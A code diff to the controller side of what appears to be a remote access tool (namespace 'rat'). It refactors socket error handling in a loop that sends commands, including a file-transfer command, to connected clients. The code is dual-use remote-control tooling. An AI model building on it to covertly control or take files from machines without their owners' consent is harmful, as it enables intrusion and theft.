@@ -1,11 +1,10 @@
-#pragma once
 #include "server/handleclient.h"
 
 namespace rat{
 
-HandleClient::HandleClient(unsigned long long client_socket, sockaddr_in client_addr): client_socket_(client_socket)
+HandleClient::HandleClient(unsigned long long client_socket, sockaddr_in client_addr)
 {
-	sock = TcpSocket(client_socket_);
+	sock = TcpSocket(client_socket);
 	std::string ip_addr;
 	ip_addr.resize((long long)20);
 	ip = inet_ntop(AF_INET, &client_addr.sin_addr, &ip_addr[0], 20);
@@ -25,8 +24,7 @@ void HandleClient::ControlClient()
 	}
 
 	while(true){
-		sock.SafeSend("", 0);
-		if (sock.Disconnected())
+		if (sock.SendBytes(std::vector<char>()) || sock.Disconnected())
 		{
 			break;
 		}
@@ -36,7 +34,11 @@ void HandleClient::ControlClient()
 		if (server_cmd.GetType() == -1) {
 			continue;
 		}
-		sock.SendBytes(server_cmd.ToTcpPacket());
+		
+		if (sock.SendBytes(server_cmd.ToTcpPacket()) < 0 || sock.Disconnected())
+		{
+			break;
+		}
 		if (server_cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
 		{
 			std::string file_path = server_cmd.GetArgument();
